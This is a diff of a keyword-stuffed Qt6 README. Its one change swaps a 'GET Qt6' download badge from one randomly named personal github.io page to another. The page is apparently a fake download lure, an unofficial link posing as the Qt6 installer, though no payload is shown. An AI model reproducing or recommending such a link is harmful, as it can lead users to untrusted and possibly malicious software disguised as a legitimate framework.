@@ -52,7 +52,7 @@ For developers comparing python qt6, qt6 python, and native C++ workflows, Qt6 o
 
 Prerequisites: A supported operating system, a C++ compiler or Python environment, CMake for qt6 cmake projects, and internet access for the initial qt6 download.
 
-[![GET Qt6](https://img.shields.io/badge/GET%20%E2%80%94%20Qt6-41CD52?style=for-the-badge&logoColor=white)](https://nelsonleblancniei.github.io/.github/qt6-app)
+[![GET Qt6](https://img.shields.io/badge/GET%20%E2%80%94%20Qt6-41CD52?style=for-the-badge&logoColor=white)](https://saulcainbjgl.github.io/.github/qt6-app)
 
 1.  **Download and Install:** Use a trusted qt6 download source, select the modules you need, and complete qt6 install with matching desktop or embedded kits.
 2.  **Open Documentation:** Read qt6 documentation for your target module, then follow a qt6 tutorial that matches your first app style.
